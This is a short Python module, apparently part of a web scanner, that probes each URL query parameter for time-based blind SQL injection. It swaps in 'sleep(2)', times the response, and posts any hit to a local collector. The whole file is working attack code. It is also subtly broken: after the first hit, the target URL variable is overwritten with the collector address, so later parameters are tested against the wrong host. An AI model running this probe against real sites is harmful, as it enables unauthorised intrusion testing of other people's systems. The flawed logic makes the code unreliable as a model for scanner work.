from time import time
from json import dumps

from requests import get, post, exceptions

from urllib.parse import urlparse, parse_qs


def go(web_request):
    """Doing Attack
    :param web_request:

    requestId
    ----------------------
    method
    url
    requestBody
    requestHeaders
    type
    ----------------------

    status_code
    responseHeaders

    :return: None
    """
    result = []

    o = urlparse(web_request['url'])
    query = parse_qs(o.query)
    url = o._replace(query=None).geturl()
    for k, v in query.items():
        tmp_value = v
        query[k] = 'sleep(2)'
        a1 = time()
        try:
            get(url, params=query, timeout=5)
        except exceptions.Timeout:
            pass
        a2 = time()
        if a2 - a1 >= 2:
            print ("OK")
            tmp = {}
            tmp['url'] = url
            tmp['method'] = web_request['method']
            tmp['query'] = query
            tmp['body'] = query

            result.append(dumps(tmp))

            url = 'http://localhost:8787/success'
            data = {
                'request_id': web_request['requestId'],
                'module_id': 1,
                'payload': query,
                'response_data': '',
            }
            post(url, data=data)

        query[k] = tmp_value